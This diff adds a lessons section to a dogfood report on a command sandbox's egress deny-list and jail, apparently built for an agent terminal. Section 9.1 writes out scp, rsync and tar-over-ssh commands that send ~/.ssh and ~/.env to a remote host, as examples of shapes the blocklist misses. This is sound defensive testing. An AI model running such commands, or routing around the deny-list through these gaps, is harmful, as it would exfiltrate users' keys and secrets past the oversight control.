@@ -254,3 +254,47 @@ previous dogfood run that redirected `HOME` into the scratch tree — holds the
 tool write credentials into them (or point the tool's own config elsewhere), and
 destroy the tree at the end of the tick. Purge is not enough for a live token —
 rotate.
+
+## 9. Errors hit during the 2026-09-19 evening run (regression re-verification + egress matrix)
+
+Full narrative: `docs/dogfood/2026-09-19-evening-integration.md`. This run
+re-verified the 09-18/09-19 morning fixes live and swept the egress deny-list
+with ssh-family shapes the earlier probes had never tried.
+
+### 9.1 A "fixed" rule class that only covers the shape it was built for
+
+The 09-18 closure of DF-17 claimed "whole-tree `rsync`/`scp` copies are
+priority-1000 BLOCK rules". True as written — but the rule (blocklist.py:693)
+arms **only when the source is the filesystem root** (`/`, `//`, `~/`). Every
+scoped-source copy — `scp -r ~/.ssh host:/tmp/`, `rsync -a ~/.env host::mod`,
+`tar cf - ~/.ssh | ssh host 'cat > /tmp/x'` — rides default-allow with
+`rule_id: null`. The nc-based exfil rules block the same primitive (local file →
+network), and their own block messages say they "do not cover ssh/scp/rsync" —
+the exclusion is documented per-rule, but no rule picks the shapes up, so the
+deny-list simply has a hole at the ssh transport. Lesson: a closure claim should
+be tested with at least one shape the rule *deliberately excludes* (the
+exclusion list is printed in the rule's block_message) — that is where the next
+gap hides. Filed as DF-29/30/31.
+
+### 9.2 The fail-closed test can itself fail silently (test-harness lesson)
+
+Verifying "requested backend that cannot run exits 2" took three attempts: (1)
+`TERMINAL_JAIL_BWRAP_BIN=/nonexistent` — no such knob exists in the wrapper; the
+command ran unjailed and my probe recorded a false pass. (2) `PATH=/usr/bin:/bin`
+— bwrap lives in /usr/bin, so it was still found. (3) A minimal PATH built from
+symlinks finally produced the real exit-2 + message. A fail-closed claim is only
+proven when the *condition* (missing binary) actually holds; an env knob that
+does not exist fails open without saying anything. Always confirm the failure
+condition is real (here: `command -v bwrap` empty under the test PATH) before
+recording the verdict.
+
+### 9.3 The spawn deadline is a coin flip, not a fixed property
+
+`bunker spawn` on las-03 deadline-exceeded on the first attempt and succeeded on
+the immediate retry (~90 s, under the 2 h TTL agent fb251522). Same client, same
+server, minutes apart — the 30-45 s cancellations of §8.5 are load-dependent,
+not deterministic. Practical rule for dogfood lanes: one retry before filing
+SKIPPED, and count leaked users (`ls /home | grep -c ^bunker-` on the host) each
+run — the count grew 17 → 33 since the morning run, so the leak (DF-26) is
+still active even though spawns now mostly succeed.
+
